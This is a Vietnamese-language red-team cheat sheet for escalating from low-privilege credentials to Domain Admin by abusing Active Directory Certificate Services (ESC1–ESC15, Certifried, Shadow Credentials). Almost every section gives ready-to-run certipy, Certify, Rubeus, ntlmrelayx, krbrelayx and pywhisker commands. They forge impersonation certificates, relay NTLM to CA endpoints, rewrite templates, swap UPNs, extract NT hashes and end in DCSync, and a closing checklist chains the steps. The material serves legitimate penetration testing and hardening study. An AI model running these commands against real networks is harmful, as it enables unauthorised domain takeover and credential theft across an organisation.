# 06 — ADCS Exploitation (ESC1–ESC15)

**Trạng thái:** có creds. **Mục tiêu:** lạm dụng template/CA cấu hình sai để xin
chứng chỉ mạo danh user đặc quyền → PKINIT lấy TGT/NT hash → DA. Nhánh "ADCS
Exploitation" của mindmap.

---

## A. Enumerate ADCS

```bash
certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip>            # liệt kê CA + template
certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip> # [-vulnerable]
ldeep ldap -u <user> -p <password> -d <domain> -s <dc_ip> templates
```

```powershell
certify.exe find
certify.exe find /vulnerable
certify.exe cas                      # thông tin CA
certify.exe pkiobjects              # box "Get PKI objects information"
certutil -TCAInfo ; certutil -v -dsTemplate
```

- **Kết quả:** tên CA, template, cờ lỗ hổng (ESCx). Ghi lại `ca_name`,
  `template name`, `ca_server`, `dc_name$`.

---

## B. Pass the Certificate (dùng chung mọi ESC)

Sau khi có `.pfx`, mindmap gom về **"Pass the certificate"**:

```bash
certipy auth -pfx <certificate> -dc-ip <dc_ip>                 # → TGT + NT hash
# PKINIT thủ công:
gettgtpkinit.py -cert-pfx <crt.pfx> -pfx-pass <crt_pass> "<domain>/<dc_name>" <tgt.ccache>
getnthash.py -key '<AS-REP encryption key>' '<domain>'/'<dc_name>'   # UnPAC-the-hash
# Chỉ Schannel (không PKINIT): dùng LDAP shell qua cert
certipy auth -pfx <pfx_file> -ldap-shell
```

```powershell
Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
```

- **Kết quả:** box **"Pass the ticket" → DCSYNC → Domain admin"** (nếu cert là
  Administrator/DC).

---

## C. ESC1 — SAN tùy ý

> **Khi nào:** template cho client-auth, cho phép **enrollee supplies subject**
> (SAN tuỳ ý), user được enroll.

```bash
certipy req -u <user>@<domain> -p <password> -target <ca_server> \
   -template '<vulnerable template name>' -ca <ca_name> -upn <target_user>@<domain>
```

```powershell
certify.exe request /ca:<server>\<ca-name> /template:"<vuln template>" /altname:"Admin"
```

- **Kết quả:** `.pfx` mạo danh `<target_user>` → Pass the certificate → DA.

## D. ESC2 / ESC3 — Any Purpose / Enrollment Agent

```bash
# ESC3: xin Enrollment Agent rồi xin "on behalf of"
certify.exe request /ca:<server>\<ca-name> /template:<template> /onbehalfof:<domain>\<user> /enrollcert:<path.pfx> [/enrollcertpw:<cert-password>]
certipy req -u <user>@<domain> -p <password> -target <ca_server> \
   -template '<vuln template>' -ca <ca_name> -on-behalf-of '<domain>\<user>' -pfx <cert>
```

## E. ESC4 — Quyền ghi trên template

> **Khi nào:** có GenericWrite/WriteDacl trên object template.

```bash
certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -save-old -debug  # lưu cấu hình cũ
# (template bị ghi đè thành dễ ESC1) rồi req như ESC1, sau đó khôi phục:
certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -configuration <template>.json
```

## F. ESC5 / ESC6

- **ESC5:** Vulnerable PKI Object access control (ACL yếu trên object PKI) → sửa
  cấu hình như ESC4/ESC7.
- **ESC6:** CA bật cờ `EDITF_ATTRIBUTESUBJECTALTNAME2` → mọi template client-auth
  đều cho đặt SAN. Khai thác như ESC1 với template bất kỳ.

## G. ESC7 — Quyền Manage CA / Manage Certificate

> **Khi nào:** có quyền ManageCA hoặc ManageCertificates trên CA.

```bash
certipy ca -ca <ca_name> -add-officer '<user>' -username <user>@<domain> \
   -password <password> -dc-ip <dc_ip> -target-ip <target_ip>        # tự thành officer
certipy ca -ca <ca_name> -enable-template '<esc1_vuln_template>' -username <user>@<domain> -password <password>
# Issue request đang pending:
certipy ca -u <user>@<domain> -p '<password>' -ca <ca_name> -issue-request <request_id>
certipy req -u <user>@<domain> -p '<password>' -ca <ca_name> -retrieve <request_id>
```

## H. ESC8 — Relay tới Web Enrollment (HTTP)

> **Khi nào:** CA bật web enrollment (`/certsrv`), chấp nhận NTLM; coerce được 1 máy.

```bash
ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
krbrelayx.py -t 'http://<pki>/certsrv/certfnsh.asp' --adcs --template DomainController -v '<target_netbios>$' -ip <attacker_ip>
# rồi coerce DC (file 01 §G) → nhận cert DC01$ → certipy auth → DCSync
```

## I. ESC9 / ESC10 — Weak cert mapping

> **Khi nào:** template `CT_FLAG_NO_SECURITY_EXTENSION` (ESC9) hoặc registry CA
> map yếu (ESC10). Cần quyền đổi `userPrincipalName` của một account.

```bash
# ESC9/ESC10 Case 1: đổi UPN của accountB thành Administrator, xin cert
certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn Administrator
certipy req -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <vuln_template>
certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn <accountB>@<domain>  # reset lại
# ESC10 Case 2: UPN = '<dc_name$>@<domain>' → cert cho DC
certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn '<dc_name$>@<domain>'
certipy auth -pfx <pfx_file> -username '<dc>$' -domain <domain> -dc-ip <dc_ip>    # [Schannel/Kerberos Mapping]
```

## J. ESC11 — Relay tới RPC (ICPR, không ký)

```bash
ntlmrelayx.py -t rpc://<ca_ip> -smb2support -rpc-mode ICPR -icpr-ca-name <ca_name>
certipy relay -target rpc://<ip_ca> -ca '<ca_name>'
certipy auth -pfx <certificate> -dc-ip <dc_ip>
```

## K. ESC13 — Issuance policy → nhóm đặc quyền

Template gắn OID issuance policy liên kết nhóm đặc quyền → xin cert có OID đó →
nhận quyền nhóm. Khai thác qua `certipy req` template tương ứng rồi PKINIT.

## L. ESC14 / ESC15

- **ESC14 (explicit mapping):** lạm dụng `altSecurityIdentities` map tường minh.
- **ESC15 (EKUwu, CVE-2024-49019):** template V1 cho thêm application policy:
  ```bash
  certipy req -u <user>@<domain> -p <password> -target <ca_server> \
     -template '<v1 template with enrollee flag>' -ca <ca_name> -upn <target_user>@<domain> \
     --application-policies 'Client Authentication'                        # chỉ Schannel
  certipy req ... --application-policies 'Certificate Request Agent'       # biến thể enrollment agent
  ```

## M. Certifried (CVE-2022-26923)

> **Khi nào:** MAQ>0; tạo máy rồi đặt dnsHostName trùng DC.

```bash
certipy account create -u <user>@<domain> -p '<password>' -user 'certifriedpc' -pass 'certifriedpass' -dns '<fqdn_dc>'
certipy req -u 'certifriedpc$'@<domain> -p 'certifriedpass' -target <ca_fqdn> -ca <ca_name> -template Machine
certipy auth -pfx <pfx> -dc-ip <dc_ip>     # → DCSync
```

## N. Shadow Credentials (Generic Write + ADCS)

> **Khi nào:** có quyền ghi `msDS-KeyCredentialLink` trên user/computer.

```bash
certipy shadow auto -username <accountA>@<domain> -p <password> -account '<target_account>'
pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "password" --target "TARGET_SAMNAME" --action "add"
```

- **Kết quả:** NT hash + TGT của target → Pass the hash/cert.

---

## Checklist ADCS

- [ ] `certipy find -vulnerable` ngay khi có creds
- [ ] ESC1/6 → `certipy req -upn administrator` → `certipy auth`
- [ ] Web enrollment + coerce → ESC8 relay
- [ ] Ghi template → ESC4 (nhớ `-save-old` để khôi phục)
- [ ] ManageCA → ESC7
- [ ] MAQ>0 → Certifried / Shadow cred
- [ ] `.pfx` → `certipy auth` → DCSync
